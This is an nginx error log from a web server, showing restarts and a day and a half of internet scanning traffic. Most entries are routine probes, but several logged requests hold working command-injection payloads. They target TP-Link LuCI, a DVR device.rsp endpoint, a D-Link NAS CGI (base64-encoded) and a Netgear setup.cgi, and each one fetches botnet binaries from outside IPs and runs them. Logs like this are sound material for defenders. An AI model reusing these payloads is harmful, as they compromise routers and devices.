2024/04/17 08:34:17 [notice] 1#1: using the "epoll" event method
2024/04/17 08:34:17 [notice] 1#1: nginx/1.22.1
2024/04/17 08:34:17 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 08:34:17 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 08:34:17 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 08:34:17 [notice] 1#1: start worker processes
2024/04/17 08:34:17 [notice] 1#1: start worker process 29
2024/04/17 08:34:17 [notice] 1#1: start worker process 30
2024/04/17 08:43:54 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2024/04/17 08:43:54 [notice] 29#29: gracefully shutting down
2024/04/17 08:43:54 [notice] 30#30: gracefully shutting down
2024/04/17 08:43:54 [notice] 29#29: exiting
2024/04/17 08:43:54 [notice] 30#30: exiting
2024/04/17 08:43:54 [notice] 29#29: exit
2024/04/17 08:43:54 [notice] 30#30: exit
2024/04/17 08:43:54 [notice] 1#1: signal 17 (SIGCHLD) received from 29
2024/04/17 08:43:54 [notice] 1#1: worker process 29 exited with code 0
2024/04/17 08:43:54 [notice] 1#1: signal 29 (SIGIO) received
2024/04/17 08:43:54 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2024/04/17 08:43:54 [notice] 1#1: worker process 30 exited with code 0
2024/04/17 08:43:54 [notice] 1#1: exit
2024/04/17 08:45:35 [notice] 1#1: using the "epoll" event method
2024/04/17 08:45:35 [notice] 1#1: nginx/1.22.1
2024/04/17 08:45:35 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 08:45:35 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 08:45:35 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 08:45:35 [notice] 1#1: start worker processes
2024/04/17 08:45:35 [notice] 1#1: start worker process 22
2024/04/17 08:45:35 [notice] 1#1: start worker process 23
2024/04/17 11:23:53 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2024/04/17 11:23:53 [notice] 22#22: gracefully shutting down
2024/04/17 11:23:53 [notice] 22#22: exiting
2024/04/17 11:23:53 [notice] 22#22: exit
2024/04/17 11:23:53 [notice] 23#23: gracefully shutting down
2024/04/17 11:23:53 [notice] 23#23: exiting
2024/04/17 11:23:53 [notice] 23#23: exit
2024/04/17 11:23:53 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2024/04/17 11:23:53 [notice] 1#1: worker process 22 exited with code 0
2024/04/17 11:23:53 [notice] 1#1: worker process 23 exited with code 0
2024/04/17 11:23:53 [notice] 1#1: exit
2024/04/17 11:27:16 [notice] 1#1: using the "epoll" event method
2024/04/17 11:27:16 [notice] 1#1: nginx/1.22.1
2024/04/17 11:27:16 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 11:27:16 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 11:27:16 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 11:27:16 [notice] 1#1: start worker processes
2024/04/17 11:27:16 [notice] 1#1: start worker process 22
2024/04/17 11:27:16 [notice] 1#1: start worker process 23
2024/04/17 11:30:44 [error] 22#22: *1 directory index of "/usr/share/nginx/html/" is forbidden, client: 212.70.149.134, server: localhost, request: "GET / HTTP/1.0"
2024/04/18 16:00:06 [error] 23#23: *115 directory index of "/usr/share/nginx/html/" is forbidden, client: 192.155.88.231, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 16:01:09 [error] 23#23: *116 directory index of "/usr/share/nginx/html/" is forbidden, client: 115.231.78.12, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 16:01:10 [error] 23#23: *117 directory index of "/usr/share/nginx/html/" is forbidden, client: 115.231.78.12, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 16:01:10 [error] 23#23: *118 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 115.231.78.12, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 16:01:10 [error] 23#23: *119 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 115.231.78.12, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 16:03:20 [error] 23#23: *120 directory index of "/usr/share/nginx/html/" is forbidden, client: 172.105.128.11, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 16:12:50 [error] 23#23: *121 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.79.181.251, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 16:47:18 [error] 23#23: *123 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.128.232.129, server: localhost, request: "GET / HTTP/1.0"
2024/04/18 17:34:33 [error] 23#23: *124 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.180.143.190, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 17:34:34 [error] 23#23: *125 open() "/usr/share/nginx/html/cf_scripts/scripts/ajax/ckeditor/ckeditor.js" failed (2: No such file or directory), client: 185.180.143.190, server: localhost, request: "GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1", host: "8.148.22.188"
2024/04/18 17:37:14 [error] 23#23: *126 directory index of "/usr/share/nginx/html/" is forbidden, client: 117.199.171.36, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 19:02:36 [error] 23#23: *128 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 19:11:07 [error] 23#23: *129 directory index of "/usr/share/nginx/html/" is forbidden, client: 205.210.31.24, server: localhost, request: "GET / HTTP/1.0"
2024/04/18 19:58:10 [error] 22#22: *132 open() "/usr/share/nginx/html/cgi/conf.bin" failed (2: No such file or directory), client: 212.70.149.134, server: localhost, request: "GET /cgi/conf.bin HTTP/1.1", host: "8.148.22.188", referrer: "http://8.148.22.188:80/mainFrame.htm"
2024/04/18 20:03:31 [error] 22#22: *133 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.128.232.129, server: localhost, request: "GET / HTTP/1.0", host: "spy.pet"
2024/04/18 20:17:36 [error] 22#22: *135 directory index of "/usr/share/nginx/html/" is forbidden, client: 167.94.145.59, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 20:17:42 [error] 22#22: *136 directory index of "/usr/share/nginx/html/" is forbidden, client: 167.94.145.59, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 20:39:11 [error] 22#22: *138 directory index of "/usr/share/nginx/html/" is forbidden, client: 37.49.227.60, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 21:41:07 [error] 22#22: *140 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 22:33:40 [error] 22#22: *142 directory index of "/usr/share/nginx/html/" is forbidden, client: 222.216.206.99, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 22:51:17 [error] 22#22: *145 directory index of "/usr/share/nginx/html/" is forbidden, client: 161.35.35.119, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 22:51:18 [error] 22#22: *146 open() "/usr/share/nginx/html/form.html" failed (2: No such file or directory), client: 161.35.35.119, server: localhost, request: "GET /form.html HTTP/1.1", host: "8.148.22.188"
2024/04/18 22:51:18 [error] 23#23: *147 open() "/usr/share/nginx/html/upl.php" failed (2: No such file or directory), client: 161.35.35.119, server: localhost, request: "GET /upl.php HTTP/1.1", host: "8.148.22.188"
2024/04/18 22:51:19 [error] 23#23: *149 "/usr/share/nginx/html/geoip/index.html" is not found (2: No such file or directory), client: 161.35.35.119, server: localhost, request: "GET /geoip/ HTTP/1.1", host: "8.148.22.188"
2024/04/18 22:51:20 [error] 23#23: *150 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 161.35.35.119, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/18 22:51:20 [error] 23#23: *151 open() "/usr/share/nginx/html/1.php" failed (2: No such file or directory), client: 161.35.35.119, server: localhost, request: "GET /1.php HTTP/1.1", host: "8.148.22.188"
2024/04/18 22:51:21 [error] 23#23: *152 open() "/usr/share/nginx/html/bundle.js" failed (2: No such file or directory), client: 161.35.35.119, server: localhost, request: "GET /bundle.js HTTP/1.1", host: "8.148.22.188"
2024/04/18 22:51:21 [error] 23#23: *153 "/usr/share/nginx/html/files/index.html" is not found (2: No such file or directory), client: 161.35.35.119, server: localhost, request: "GET /files/ HTTP/1.1", host: "8.148.22.188"
2024/04/18 22:51:22 [error] 23#23: *154 open() "/usr/share/nginx/html/systembc/password.php" failed (2: No such file or directory), client: 161.35.35.119, server: localhost, request: "GET /systembc/password.php HTTP/1.1", host: "8.148.22.188"
2024/04/18 22:51:22 [error] 23#23: *155 open() "/usr/share/nginx/html/password.php" failed (2: No such file or directory), client: 161.35.35.119, server: localhost, request: "GET /password.php HTTP/1.1", host: "8.148.22.188"
2024/04/18 22:51:23 [error] 23#23: *156 open() "/usr/share/nginx/html/info.php" failed (2: No such file or directory), client: 161.35.35.119, server: localhost, request: "GET /info.php HTTP/1.1", host: "8.148.22.188"
2024/04/18 22:53:20 [error] 23#23: *157 directory index of "/usr/share/nginx/html/" is forbidden, client: 198.199.117.125, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 22:55:27 [error] 23#23: *158 directory index of "/usr/share/nginx/html/" is forbidden, client: 198.235.24.139, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 23:03:37 [error] 23#23: *159 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.233.83.232, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 00:14:14 [error] 23#23: *161 directory index of "/usr/share/nginx/html/" is forbidden, client: 125.76.87.134, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 00:26:37 [error] 22#22: *163 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 00:58:09 [error] 22#22: *164 directory index of "/usr/share/nginx/html/" is forbidden, client: 46.174.191.29, server: localhost, request: "GET / HTTP/1.0"
2024/04/19 01:22:16 [error] 22#22: *165 directory index of "/usr/share/nginx/html/" is forbidden, client: 198.235.24.197, server: localhost, request: "GET / HTTP/1.0"
2024/04/19 01:36:10 [error] 22#22: *166 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 01:37:53 [error] 22#22: *167 directory index of "/usr/share/nginx/html/" is forbidden, client: 172.214.141.49, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 01:54:53 [error] 22#22: *168 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 03:48:01 [error] 22#22: *173 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 04:22:36 [error] 22#22: *174 directory index of "/usr/share/nginx/html/" is forbidden, client: 197.248.83.95, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 04:56:30 [error] 22#22: *175 directory index of "/usr/share/nginx/html/" is forbidden, client: 34.79.162.186, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 04:59:07 [error] 22#22: *176 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 51.195.193.133, server: localhost, request: "GET /.env HTTP/1.1", host: "8.148.22.188"
2024/04/19 05:07:37 [error] 22#22: *177 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 05:08:04 [error] 22#22: *178 directory index of "/usr/share/nginx/html/" is forbidden, client: 64.62.156.47, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 05:09:47 [error] 23#23: *179 "/usr/share/nginx/html/webui/index.html" is not found (2: No such file or directory), client: 64.62.156.49, server: localhost, request: "GET /webui/ HTTP/1.1", host: "8.148.22.188"
2024/04/19 05:12:13 [error] 23#23: *180 "/usr/share/nginx/html/geoserver/web/index.html" is not found (2: No such file or directory), client: 64.62.156.46, server: localhost, request: "GET /geoserver/web/ HTTP/1.1", host: "8.148.22.188"
2024/04/19 05:17:35 [error] 23#23: *181 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 05:17:51 [error] 23#23: *182 open() "/usr/share/nginx/html/device.rsp" failed (2: No such file or directory), client: 80.94.92.60, server: localhost, request: "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=echo%3Bcd%20%2Fvar%2Ftmp%3Bwget%20http%3A%2F%2F94.156.79.129%2Farm7%3Bchmod%20777%20arm7%3B%20.%2Farm7%200daydvr%3B HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 06:15:47 [error] 23#23: *183 directory index of "/usr/share/nginx/html/" is forbidden, client: 115.231.78.12, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 06:24:10 [error] 23#23: *184 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.128.232.229, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 06:30:01 [error] 23#23: *185 directory index of "/usr/share/nginx/html/" is forbidden, client: 115.231.78.12, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 06:30:02 [error] 23#23: *186 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 115.231.78.12, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 06:30:02 [error] 23#23: *187 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 115.231.78.12, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 06:30:16 [error] 23#23: *189 directory index of "/usr/share/nginx/html/" is forbidden, client: 167.94.138.51, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 06:30:20 [error] 23#23: *190 directory index of "/usr/share/nginx/html/" is forbidden, client: 167.94.138.51, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 06:44:22 [error] 23#23: *192 directory index of "/usr/share/nginx/html/" is forbidden, client: 35.203.210.219, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 07:02:58 [error] 23#23: *193 open() "/usr/share/nginx/html/cgi-bin/nas_sharing.cgi" failed (2: No such file or directory), client: 80.94.92.60, server: localhost, request: "GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cm0JLXJmCWxvbAl8CXdnZXQJLU8tCWh0dHA6Ly85NC4xNTYuNzkuMTI5L2xvbHxzaA== HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 07:07:12 [error] 23#23: *194 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.191.126.213, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 07:16:37 [error] 22#22: *195 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 07:21:14 [error] 22#22: *196 directory index of "/usr/share/nginx/html/" is forbidden, client: 35.203.211.117, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 07:44:47 [error] 22#22: *197 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 09:11:12 [error] 22#22: *202 directory index of "/usr/share/nginx/html/" is forbidden, client: 171.43.237.8, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 09:11:12 [error] 22#22: *202 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 171.43.237.8, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188", referrer: "http://8.148.22.188/"
2024/04/19 09:42:34 [error] 22#22: *203 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 10:51:16 [error] 22#22: *207 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.21, server: localhost, request: "GET / HTTP/1.0"
2024/04/19 10:51:17 [error] 22#22: *209 open() "/usr/share/nginx/html/nmaplowercheck1713523876" failed (2: No such file or directory), client: 104.152.52.21, server: localhost, request: "GET /nmaplowercheck1713523876 HTTP/1.1", host: "8.148.22.188"
2024/04/19 10:51:17 [error] 22#22: *208 open() "/usr/share/nginx/html/sdk" failed (2: No such file or directory), client: 104.152.52.21, server: localhost, request: "POST /sdk HTTP/1.1", host: "8.148.22.188"
2024/04/19 10:51:17 [error] 22#22: *210 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.21, server: localhost, request: "GET / HTTP/1.0"
2024/04/19 10:51:17 [error] 23#23: *211 open() "/usr/share/nginx/html/evox/about" failed (2: No such file or directory), client: 104.152.52.21, server: localhost, request: "GET /evox/about HTTP/1.1", host: "8.148.22.188"
2024/04/19 10:51:19 [error] 23#23: *213 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.21, server: localhost, request: "GET / HTTP/1.0"
2024/04/19 11:03:30 [error] 23#23: *216 directory index of "/usr/share/nginx/html/" is forbidden, client: 47.236.251.77, server: localhost, request: "GET http://passport.baidu.com/ HTTP/1.1", host: "passport.baidu.com:80"
2024/04/19 11:10:02 [error] 23#23: *218 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 11:36:29 [error] 23#23: *220 open() "/usr/share/nginx/html/setup.cgi" failed (2: No such file or directory), client: 120.85.115.254, server: localhost, request: "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0"
2024/04/19 11:37:26 [error] 23#23: *223 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.248.223.245, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 11:37:27 [error] 23#23: *224 open() "/usr/share/nginx/html/form.html" failed (2: No such file or directory), client: 104.248.223.245, server: localhost, request: "GET /form.html HTTP/1.1", host: "8.148.22.188"
2024/04/19 11:37:27 [error] 23#23: *225 open() "/usr/share/nginx/html/upl.php" failed (2: No such file or directory), client: 104.248.223.245, server: localhost, request: "GET /upl.php HTTP/1.1", host: "8.148.22.188"
2024/04/19 11:37:28 [error] 22#22: *227 "/usr/share/nginx/html/geoip/index.html" is not found (2: No such file or directory), client: 104.248.223.245, server: localhost, request: "GET /geoip/ HTTP/1.1", host: "8.148.22.188"
2024/04/19 11:37:28 [error] 22#22: *228 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 104.248.223.245, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/19 11:37:29 [error] 22#22: *229 open() "/usr/share/nginx/html/1.php" failed (2: No such file or directory), client: 104.248.223.245, server: localhost, request: "GET /1.php HTTP/1.1", host: "8.148.22.188"
2024/04/19 11:37:29 [error] 22#22: *230 open() "/usr/share/nginx/html/bundle.js" failed (2: No such file or directory), client: 104.248.223.245, server: localhost, request: "GET /bundle.js HTTP/1.1", host: "8.148.22.188"
2024/04/19 11:37:30 [error] 22#22: *231 "/usr/share/nginx/html/files/index.html" is not found (2: No such file or directory), client: 104.248.223.245, server: localhost, request: "GET /files/ HTTP/1.1", host: "8.148.22.188"
2024/04/19 11:37:30 [error] 22#22: *232 open() "/usr/share/nginx/html/systembc/password.php" failed (2: No such file or directory), client: 104.248.223.245, server: localhost, request: "GET /systembc/password.php HTTP/1.1", host: "8.148.22.188"
2024/04/19 11:37:31 [error] 22#22: *233 open() "/usr/share/nginx/html/password.php" failed (2: No such file or directory), client: 104.248.223.245, server: localhost, request: "GET /password.php HTTP/1.1", host: "8.148.22.188"
2024/04/19 11:37:31 [error] 22#22: *234 open() "/usr/share/nginx/html/info.php" failed (2: No such file or directory), client: 104.248.223.245, server: localhost, request: "GET /info.php HTTP/1.1", host: "8.148.22.188"
2024/04/19 12:08:21 [error] 22#22: *235 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 14:28:27 [error] 22#22: *239 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 14:57:49 [error] 22#22: *242 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 15:39:45 [error] 23#23: *243 directory index of "/usr/share/nginx/html/" is forbidden, client: 103.203.56.1, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 15:48:17 [error] 23#23: *244 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 15:48:34 [error] 23#23: *245 directory index of "/usr/share/nginx/html/" is forbidden, client: 151.235.247.21, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 16:18:17 [error] 23#23: *248 open() "/usr/share/nginx/html/amKC" failed (2: No such file or directory), client: 148.153.45.238, server: localhost, request: "GET /amKC HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 16:18:20 [error] 23#23: *249 open() "/usr/share/nginx/html/nRDY" failed (2: No such file or directory), client: 148.153.45.238, server: localhost, request: "GET /nRDY HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 16:18:22 [error] 23#23: *250 open() "/usr/share/nginx/html/aab8" failed (2: No such file or directory), client: 148.153.45.238, server: localhost, request: "GET /aab8 HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 16:18:24 [error] 23#23: *251 open() "/usr/share/nginx/html/jquery-3.3.1.slim.min.js" failed (2: No such file or directory), client: 148.153.45.238, server: localhost, request: "GET /jquery-3.3.1.slim.min.js HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 16:18:24 [error] 23#23: *252 open() "/usr/share/nginx/html/aab9" failed (2: No such file or directory), client: 148.153.45.238, server: localhost, request: "GET /aab9 HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 16:18:25 [error] 23#23: *253 open() "/usr/share/nginx/html/jquery-3.3.2.slim.min.js" failed (2: No such file or directory), client: 148.153.45.238, server: localhost, request: "GET /jquery-3.3.2.slim.min.js HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 17:24:58 [error] 23#23: *254 directory index of "/usr/share/nginx/html/" is forbidden, client: 168.232.15.49, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 18:43:25 [error] 23#23: *255 directory index of "/usr/share/nginx/html/" is forbidden, client: 82.118.23.8, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 18:45:12 [error] 23#23: *256 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
